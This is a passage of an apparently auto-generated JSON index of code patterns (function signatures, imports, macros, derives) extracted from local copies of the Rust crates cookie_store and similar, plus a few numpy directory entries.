          "fn is_match(cp: &str, rp: &str) {",
          "fn is_mismatch(cp: &str, rp: &str) {",
          "fn bad_paths() {",
          "fn bad_path_defaults() {",
          "fn get_path(cp: &str, url: &str) -> String {",
          "fn shortest_path() {",
          "fn identical_paths() {",
          "fn cookie_path_prefix1() {",
          "fn cookie_path_prefix2() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CookiePath {",
          "impl AsRef<str> for CookiePath {",
          "impl Deref for CookiePath {",
          "impl From<CookiePath> for String {"
        ],
        "uses": [
          "use serde_derive::{Deserialize, Serialize};",
          "use std::cmp::max;",
          "use std::ops::Deref;",
          "use url::Url;",
          "use super::CookiePath;",
          "use url::Url;"
        ],
        "macros": [
          "assert_eq!(get_path(\"data:foobusbar\"), \"/\");",
          "assert_eq!(get_path(\"http://example.com\"), \"/\");",
          "assert_eq!(get_path(\"http://example.com/\"), \"/\");",
          "assert_eq!(get_path(\"http://example.com/foo\"), \"/\");",
          "assert_eq!(get_path(\"http://example.com/foo/\"), \"/foo\");",
          "assert_eq!(get_path(\"http://example.com//foo/\"), \"//foo\");",
          "assert_eq!(get_path(\"http://example.com/foo//\"), \"/foo/\");",
          "assert_eq!(get_path(\"http://example.com/foo/bus/bar\"), \"/foo/bus\");",
          "assert_eq!(get_path(\"http://example.com/foo//bus/bar\"), \"/foo//bus\");",
          "assert_eq!(get_path(\"http://example.com/foo/bus/bar/\"), \"/foo/bus/bar\");",
          "let url = Url::parse(&format!(\"http://example.com{}\", rp))",
          "assert!(",
          "assert!(CookiePath::parse(\"\").is_none());",
          "assert!(CookiePath::parse(\"a/foo\").is_none());",
          "assert_eq!(get_path(\"\", \"http://example.com/\"), \"/\");",
          "assert_eq!(get_path(\"a/foo\", \"http://example.com/\"), \"/\");",
          "assert_eq!(get_path(\"\", \"http://example.com/foo/bar\"), \"/foo\");",
          "assert_eq!(get_path(\"a/foo\", \"http://example.com/foo/bar\"), \"/foo\");",
          "assert_eq!(get_path(\"\", \"http://example.com/foo/bar/\"), \"/foo/bar\");",
          "assert_eq!(get_path(\"a/foo\", \"http://example.com/foo/bar/\"), \"/foo/bar\");"
        ],
        "derives": [
          "#[derive(Serialize, Deserialize, PartialEq, Eq, Clone, Debug, Hash, PartialOrd, Ord)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/cookie_domain.rs",
        "function_defs": [
          "fn try_from(value: &str) -> Result<CookieDomain, Self::Error> {",
          "fn try_from(cookie: &'a RawCookie<'c>) -> Result<CookieDomain, Self::Error> {",
          "fn from(c: &'a CookieDomain) -> String {",
          "fn matches(expected: bool, cookie_domain: &CookieDomain, url: &str) {",
          "fn variants(expected: bool, cookie_domain: &CookieDomain, url: &str) {",
          "fn matches_hostonly() {",
          "fn from_strs() {",
          "fn from_raw_cookie() {",
          "fn raw_cookie(s: &str) -> RawCookie<'_> {",
          "fn matches_suffix() {",
          "fn encode_decode(cd: &CookieDomain, exp_json: &str) {",
          "fn serde() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CookieDomain {"
        ],
        "uses": [
          "use std;",
          "use cookie::Cookie as RawCookie;",
          "use idna;",
          "use publicsuffix::{List, Psl, Suffix};",
          "use serde_derive::{Deserialize, Serialize};",
          "use std::convert::TryFrom;",
          "use url::{Host, Url};",
          "use crate::utils::is_host_name;",
          "use crate::CookieError;",
          "use cookie::Cookie as RawCookie;",
          "use std::convert::TryFrom;",
          "use url::Url;",
          "use super::CookieDomain;",
          "use crate::utils::test::*;",
          "use serde_json;",
          "use std::convert::TryFrom;",
          "use crate::cookie_domain::CookieDomain;",
          "use crate::utils::test::*;"
        ],
        "macros": [
          "Host::Ipv4(addr) => CookieDomain::HostOnly(format!(\"{}\", addr)),",
          "Host::Ipv6(addr) => CookieDomain::HostOnly(format!(\"[{}]\", addr)),",
          "assert!(",
          "matches(expected, cookie_domain, &format!(\"{}/\", url));",
          "matches(expected, cookie_domain, &format!(\"{}:8080\", url));",
          "matches(expected, cookie_domain, &format!(\"{}/foo/bar\", url));",
          "matches(expected, cookie_domain, &format!(\"{}:8080/foo/bar\", url));",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(",
          "assert!("
        ],
        "derives": [
          "#[derive(PartialEq, Eq, Clone, Debug, Hash, PartialOrd, Ord, Serialize, Deserialize)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/cookie.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(_: ParseError) -> Error {",
          "fn deref(&self) -> &Self::Target {",
          "fn from(cookie: Cookie<'a>) -> RawCookie<'static> {",
          "fn cmp_domain(cookie: &str, url: &str, exp: CookieDomain) {",
          "fn no_domain() {",
          "fn empty_domain() {",
          "fn mismatched_domain() {",
          "fn domains() {",
          "fn domain_from(domain: &str, request_url: &str, is_some: bool) {",
          "fn httponly() {",
          "fn identical_domain() {",
          "fn identical_domain_leading_dot() {",
          "fn identical_domain_two_leading_dots() {",
          "fn upper_case_domain() {",
          "fn cmp_path(cookie: &str, url: &str, exp: &str) {",
          "fn no_path() {",
          "fn empty_path() {",
          "fn invalid_path() {",
          "fn path() {",
          "fn in_days(days: i64) -> OffsetDateTime {",
          "fn in_minutes(mins: i64) -> OffsetDateTime {",
          "fn max_age_bounds() {",
          "fn max_age() {",
          "fn expired() {",
          "fn session_end() {",
          "fn expires_tmrw_at_utc() {",
          "fn expired_yest_at_utc() {",
          "fn is_persistent() {",
          "fn max_age_overrides_expires() {",
          "fn matches() {",
          "fn do_match(exp: bool, cookie: &str, src_url: &str, request_url: Option<&str>) {",
          "fn is_match(cookie: &str, url: &str, request_url: Option<&str>) {",
          "fn is_mismatch(cookie: &str, url: &str, request_url: Option<&str>) {",
          "fn encode_decode(c: &Cookie<'_>, expected: serde_json::Value) {",
          "fn serde() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl std::error::Error for Error {}",
          "impl fmt::Display for Error {",
          "impl From<ParseError> for Error {"
        ],
        "uses": [
          "use crate::cookie_domain::CookieDomain;",
          "use crate::cookie_expiration::CookieExpiration;",
          "use crate::cookie_path::CookiePath;",
          "use crate::utils::{is_http_scheme, is_secure};",
          "use cookie::{Cookie as RawCookie, CookieBuilder as RawCookieBuilder, ParseError};",
          "use serde_derive::{Deserialize, Serialize};",
          "use std::borrow::Cow;",
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use std::ops::Deref;",
          "use time;",
          "use url::Url;",
          "use cookie::Cookie as RawCookie;",
          "use serde::de::Error;",
          "use serde::de::Unexpected;",
          "use serde::{Deserialize, Deserializer, Serialize, Serializer};",
          "use std::str::FromStr;",
          "use super::Cookie;",
          "use crate::cookie_domain::CookieDomain;",
          "use crate::cookie_expiration::CookieExpiration;",
          "use cookie::Cookie as RawCookie;",
          "use time::{Duration, OffsetDateTime};",
          "use url::Url;",
          "use crate::utils::test as test_utils;",
          "use crate::cookie::Cookie;",
          "use crate::cookie_expiration::CookieExpiration;",
          "use crate::utils::test as test_utils;",
          "use crate::utils::test::*;",
          "use serde_json::json;",
          "use time;"
        ],
        "macros": [
          "write!(",
          "assert!(ua.domain == exp, \"\\n{:?}\", ua);",
          "assert!(ua.is_err(), \"{:?}\", ua);",
          "let cookie_str = format!(\"cookie1=value1; Domain={}\", domain);",
          "assert_eq!(is_some, cookie.is_ok())",
          "assert!(ua.is_err(), \"{:?}\", ua);",
          "assert!(String::from(ua.path.clone()) == exp, \"\\n{:?}\", ua);",
          "assert!(match ua.expires {",
          "assert!(!ua.is_expired());",
          "assert!(ua.expires_by(&in_minutes(2)));",
          "assert!(ua.is_expired());",
          "assert!(ua.expires_by(&in_days(-1)));",
          "assert!(ua.is_expired());",
          "assert!(ua.expires_by(&in_days(-1)));",
          "assert!(ua.is_expired());",
          "assert!(ua.expires_by(&in_days(-1)));",
          "assert!(match ua.expires {",
          "assert!(!ua.is_expired());",
          "assert!(!ua.expires_by(&in_days(1)));",
          "assert!(!ua.expires_by(&in_days(-1)));",
          "assert!(!ua.is_expired());",
          "assert!(ua.expires_by(&in_days(2)));",
          "assert!(ua.is_expired());",
          "assert!(!ua.expires_by(&in_days(-2)));",
          "assert!(!ua.is_persistent()); // SessionEnd",
          "assert!(ua.is_persistent()); // AtUtc from Expires",
          "assert!(ua.is_persistent()); // AtUtc from Max-Age",
          "assert!(!ua.is_expired());",
          "assert!(ua.expires_by(&in_minutes(2)));",
          "assert!(",
          "assert_eq!(",
          "assert_eq!(",
          "json!({",
          "json!({",
          "json!({",
          "let at_utc = time::macros::date!(2015 - 08 - 11)",
          ".with_time(time::macros::time!(16:41:42))",
          "json!({",
          "CookieExpiration::SessionEnd => unreachable!(),",
          "let raw_cookie_value = format!(\"cookie5=value5; Expires={utc_formatted}\");",
          "json!({",
          "dbg!(&at_utc);",
          "dbg!(&max_age);",
          "CookieExpiration::SessionEnd => unreachable!(),",
          "dbg!(&utc_tm);",
          "json!({",
          "CookieExpiration::SessionEnd => unreachable!(),",
          "json!({"
        ],
        "derives": [
          "#[derive(Debug, Clone, PartialEq, Eq)]",
          "#[derive(PartialEq, Clone, Debug, Serialize, Deserialize)]"
        ],
        "error_handling": 34
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie_store-0.20.0/src/utils.rs",
        "function_defs": [
          "fn into_url(self) -> Result<Url, UrlError>;",
          "fn into_url(self) -> Result<Url, UrlError> {",
          "fn into_url(self) -> Result<Url, UrlError> {",
          "fn into_url(self) -> Result<Url, UrlError> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl IntoUrl for Url {"
        ],
        "uses": [
          "use std::net::{Ipv4Addr, Ipv6Addr};",
          "use url::Url;",
          "use url::{Host, ParseError as UrlError};",
          "use crate::cookie::Cookie;",
          "use time::{Duration, OffsetDateTime};",
          "use url::Url;"
        ],
        "macros": [
          "format!(",
          "expires.map_or(String::from(\"\"), |e| format!(",
          "e.format(time::macros::format_description!(\"[weekday repr:short], [day] [month r",
          "max_age.map_or(String::from(\"\"), |m| format!(\"; Max-Age={}\", m))"
        ],
        "derives": [],
        "error_handling": 4
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/polynomial",
    "name": "polynomial",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/polynomial",
    "name": "polynomial",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0",
    "name": "similar-2.7.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/udiff.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs::read;",
          "use std::io;",
          "use std::process::exit;",
          "use similar::TextDiff;"
        ],
        "macros": [
          "eprintln!(\"usage: udiff [old] [new]\");"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/serde.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::TextDiff;"
        ],
        "macros": [
          "println!(\"{}\", serde_json::to_string_pretty(&all_changes).unwrap());"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/close-matches.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::get_close_matches;"
        ],
        "macros": [
          "println!(\"{:?}\", get_close_matches(\"app\", &words, 3, 0.7));",
          "println!(\"{:?}\", get_close_matches(\"bee\", &words, 3, 0.7));"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/terminal.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use console::Style;",
          "use similar::{ChangeTag, TextDiff};"
        ],
        "macros": [
          "print!(\"{}{}\", style.apply_to(sign).bold(), style.apply_to(change));"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/terminal-inline.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn main() {"
        ],
        "struct_defs": [
          "struct Line(Option<usize>);"
        ],
        "impl_blocks": [
          "impl fmt::Display for Line {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::fs::read;",
          "use std::process::exit;",
          "use console::{style, Style};",
          "use similar::{ChangeTag, TextDiff};"
        ],
        "macros": [
          "None => write!(f, \"    \"),",
          "Some(idx) => write!(f, \"{:<4}\", idx + 1),",
          "eprintln!(\"usage: terminal-inline [old] [new]\");",
          "println!(\"{:-^1$}\", \"-\", 80);",
          "print!(",
          "print!(\"{}\", s.apply_to(value).underlined().on_black());",
          "print!(\"{}\", s.apply_to(value));",
          "println!();"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/patience.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::{Algorithm, TextDiff};"
        ],
        "macros": [
          "println!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/large.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::TextDiff;"
        ],
        "macros": [
          "println!(\"{}\", diff.unified_diff());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/original-slices.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::utils::diff_chars;",
          "use similar::Algorithm;"
        ],
        "macros": [
          "println!(\"{}{:?}\", change_tag, value);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/examples/nonstring.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use similar::{capture_diff_slices, Algorithm};"
        ],
        "macros": [
          "println!(\"{:?}\", change);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/udiff.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn start(&self) -> usize {",
          "fn end(&self) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn header_opt(&mut self, header: Option<(&str, &str)>) -> &mut Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn test_unified_diff() {",
          "fn test_empty_unified_diff() {",
          "fn test_unified_diff_newline_hint() {"
        ],
        "struct_defs": [
          "struct MissingNewlineHint(bool);",
          "struct UnifiedDiffHunkRange(usize, usize);"
        ],
        "impl_blocks": [
          "impl fmt::Display for MissingNewlineHint {",
          "impl UnifiedDiffHunkRange {",
          "impl fmt::Display for UnifiedDiffHunkRange {",
          "impl UnifiedHunkHeader {",
          "impl fmt::Display for UnifiedHunkHeader {"
        ],
        "uses": [
          "use std::{fmt, io};",
          "use crate::iter::AllChangesIter;",
          "use crate::text::{DiffableStr, TextDiff};",
          "use crate::types::{Algorithm, DiffOp};"
        ],
        "macros": [
          "//! print!(\"{}\", text_diff",
          "write!(f, \"\\n\\\\ No newline at end of file\")?;",
          "write!(f, \"{}\", beginning)",
          "write!(f, \"{},{}\", beginning, len)",
          "write!(f, \"@@ -{} +{} @@\", &self.old_range, &self.new_range)",
          "/// print!(\"{}\", text_diff",
          "writeln!(w, \"--- {}\", old_file)?;",
          "writeln!(w, \"+++ {}\", new_file)?;",
          "write!(w, \"{}\", hunk)?;",
          "writeln!(w, \"{}\", self.header())?;",
          "write!(w, \"{}\", change.tag())?;",
          "writeln!(w)?;",
          "writeln!(w, \"{}\", MissingNewlineHint(self.missing_newline_hint))?;",
          "writeln!(f, \"{}\", self.header())?;",
          "write!(f, \"{}{}\", change.tag(), change.to_string_lossy())?;",
          "writeln!(f)?;",
          "writeln!(f, \"{}\", MissingNewlineHint(self.missing_newline_hint))?;",
          "writeln!(f, \"--- {}\", old_file)?;",
          "writeln!(f, \"+++ {}\", new_file)?;",
          "write!(f, \"{}\", hunk)?;",
          "insta::assert_snapshot!(&diff.unified_diff().header(\"a.txt\", \"b.txt\").to_string(",
          "assert_eq!(diff.unified_diff().header(\"a.txt\", \"b.txt\").to_string(), \"\");",
          "insta::assert_snapshot!(&diff.unified_diff().header(\"a.txt\", \"b.txt\").to_string(",
          "insta::assert_snapshot!(&diff"
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug)]"
        ],
        "error_handling": 22
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/types.rs",
        "function_defs": [
          "fn default() -> Algorithm {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn adjust(&mut self, adjust_offset: (usize, bool), adjust_len: (usize, bool)) {",
          "fn modify(val: &mut usize, adj: (usize, bool)) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Default for Algorithm {",
          "impl fmt::Display for ChangeTag {",
          "impl DiffOp {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::ops::{Index, Range};",
          "use crate::algorithms::utils::is_empty_range;",
          "use crate::algorithms::DiffHook;",
          "use crate::iter::ChangesIter;",
          "use super::*;",
          "use crate::text::DiffableStr;",
          "use std::borrow::Cow;"
        ],
        "macros": [
          "write!(",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "write!("
        ],
        "derives": [
          "#[derive(Clone, Copy, Hash, PartialEq, Eq, PartialOrd, Ord, Debug)]",
          "#[derive(Debug, PartialEq, Eq, Hash, Clone, Copy, Ord, PartialOrd)]",
          "#[derive(Debug, PartialEq, Eq, Hash, Clone, Copy, Ord, PartialOrd)]",
          "#[derive(Debug, PartialEq, Eq, Hash, Clone, Copy)]",
          "#[derive(Debug, PartialEq, Eq, Hash, Clone, Copy, Ord, PartialOrd)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//!     print!(\"{}{}\", sign, change);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/iter.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::marker::PhantomData;",
          "use std::ops::{Index, Range};",
          "use crate::{Change, ChangeTag, DiffOp, DiffTag};",
          "use super::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/deadline_support.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::time::Duration;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/utils.rs",
        "function_defs": [
          "fn new(source: &'x T, slices: &[&'x T]) -> SliceRemapper<'x, T> {",
          "fn slice(&self, range: Range<usize>) -> Option<&'x T> {",
          "fn index(&self, range: Range<usize>) -> &Self::Output {",
          "fn test_remapper() {"
        ],
        "struct_defs": [
          "struct SliceRemapper<'x, T: ?Sized> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::hash::Hash;",
          "use std::ops::{Index, Range};",
          "use crate::{"
        ],
        "macros": [
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(diff_slices(Algorithm::Myers, &old, &new), vec![",
          "/// assert_eq!(diff_chars(Algorithm::Myers, \"foobarbaz\", \"fooBARbaz\"), vec![",
          "/// assert_eq!(diff_words(Algorithm::Myers, \"foo bar baz\", \"foo bor baz\"), vec![",
          "/// assert_eq!(diff_unicode_words(Algorithm::Myers, old, new), vec![",
          "/// assert_eq!(diff_graphemes(Algorithm::Myers, old, new), vec![",
          "/// assert_eq!(diff_lines(Algorithm::Myers, \"foo\\nbar\\nbaz\\nblah\", \"foo\\nbar\\nba",
          "dbg!(&words);",
          "assert_eq!(remap.slice(0..3), Some(\"foo bar\"));",
          "assert_eq!(remap.slice(1..3), Some(\" bar\"));",
          "assert_eq!(remap.slice(0..1), Some(\"foo\"));",
          "assert_eq!(remap.slice(0..5), Some(\"foo bar baz\"));",
          "assert_eq!(remap.slice(0..6), None);"
        ],
        "derives": [],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/common.rs",
        "function_defs": [
          "fn test_non_string_iter_change() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::hash::Hash;",
          "use std::ops::{Index, Range};",
          "use crate::algorithms::{diff_deadline, Capture, Compact, Replace};",
          "use crate::deadline_support::Instant;",
          "use crate::{Algorithm, DiffOp};",
          "use crate::ChangeTag;"
        ],
        "macros": [
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/hook.rs",
        "function_defs": [
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), Self::Error> {",
          "fn delete(",
          "fn insert(",
          "fn replace(",
          "fn finish(&mut self) -> Result<(), Self::Error> {",
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), Self::Error> {",
          "fn delete(",
          "fn insert(",
          "fn replace(",
          "fn finish(&mut self) -> Result<(), Self::Error> {",
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), Self::Error> {",
          "fn delete(",
          "fn insert(",
          "fn replace(",
          "fn finish(&mut self) -> Result<(), Self::Error> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/compact.rs",
        "function_defs": [
          "fn as_ref(&self) -> &D {",
          "fn as_mut(&mut self) -> &mut D {",
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), Self::Error> {",
          "fn delete(",
          "fn insert(",
          "fn finish(&mut self) -> Result<(), Self::Error> {",
          "fn shift_diff_ops_up<Old, New>(",
          "fn shift_diff_ops_down<Old, New>("
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::ops::Index;",
          "use crate::{DiffOp, DiffTag};",
          "use super::utils::{common_prefix_len, common_suffix_len};",
          "use super::DiffHook;"
        ],
        "macros": [
          "_ => unreachable!(\"unexpected tag\"),",
          "_ => unreachable!(\"unexpected tag\"),"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/lcs.rs",
        "function_defs": [
          "fn make_table<Old, New>(",
          "fn test_table() {",
          "fn test_diff() {",
          "fn test_contiguous() {",
          "fn test_pat() {",
          "fn test_same() {",
          "fn test_finish_called() {",
          "fn finish(&mut self) -> Result<(), Self::Error> {",
          "fn test_bad_range_regression() {"
        ],
        "struct_defs": [
          "struct HasRunFinish(bool);"
        ],
        "impl_blocks": [
          "impl DiffHook for HasRunFinish {"
        ],
        "uses": [
          "use std::collections::BTreeMap;",
          "use std::ops::{Index, Range};",
          "use crate::algorithms::utils::{common_prefix_len, common_suffix_len, is_empty_range};",
          "use crate::algorithms::DiffHook;",
          "use crate::deadline_support::{deadline_exceeded, Instant};",
          "use crate::algorithms::Capture;",
          "use crate::DiffOp;"
        ],
        "macros": [
          "assert_eq!(table, expected);",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "insta::assert_debug_snapshot!(d.ops());",
          "insta::assert_debug_snapshot!(d.ops());",
          "assert!(d.0);",
          "assert!(d.0);",
          "assert!(d.0);",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 31
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/myers.rs",
        "function_defs": [
          "fn new(max_d: usize) -> Self {",
          "fn len(&self) -> usize {",
          "fn index(&self, index: isize) -> &Self::Output {",
          "fn index_mut(&mut self, index: isize) -> &mut Self::Output {",
          "fn max_d(len1: usize, len2: usize) -> usize {",
          "fn split_at(range: Range<usize>, at: usize) -> (Range<usize>, Range<usize>) {",
          "fn find_middle_snake<Old, New>(",
          "fn conquer<Old, New, D>(",
          "fn test_find_middle_snake() {",
          "fn test_diff() {",
          "fn test_contiguous() {",
          "fn test_pat() {",
          "fn test_deadline_reached() {",
          "fn index(&self, index: usize) -> &Self::Output {",
          "fn test_finish_called() {",
          "fn finish(&mut self) -> Result<(), Self::Error> {"
        ],
        "struct_defs": [
          "struct V {",
          "struct SlowIndex<'a>(&'a [usize]);",
          "struct HasRunFinish(bool);"
        ],
        "impl_blocks": [
          "impl V {",
          "impl Index<isize> for V {",
          "impl IndexMut<isize> for V {",
          "impl Index<usize> for SlowIndex<'_> {",
          "impl DiffHook for HasRunFinish {"
        ],
        "uses": [
          "use std::ops::{Index, IndexMut, Range};",
          "use crate::algorithms::utils::{common_prefix_len, common_suffix_len, is_empty_range};",
          "use crate::algorithms::DiffHook;",
          "use crate::deadline_support::{deadline_exceeded, Instant};",
          "use std::ops::Index;",
          "use std::time::Duration;"
        ],
        "macros": [
          "assert!(vf.len() >= d_max);",
          "assert!(vb.len() >= d_max);",
          "assert_eq!(x_start, 4);",
          "assert_eq!(y_start, 1);",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "insta::assert_debug_snapshot!(d.ops());",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "assert!(d.0);",
          "assert!(d.0);",
          "assert!(d.0);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 27
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::hash::Hash;",
          "use std::ops::{Index, Range};",
          "use crate::deadline_support::Instant;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/replace.rs",
        "function_defs": [
          "fn flush_eq(&mut self) -> Result<(), D::Error> {",
          "fn flush_del_ins(&mut self) -> Result<(), D::Error> {",
          "fn as_ref(&self) -> &D {",
          "fn as_mut(&mut self) -> &mut D {",
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), D::Error> {",
          "fn delete(",
          "fn insert(",
          "fn replace(",
          "fn finish(&mut self) -> Result<(), D::Error> {",
          "fn test_mayers_replace() {",
          "fn test_replace() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
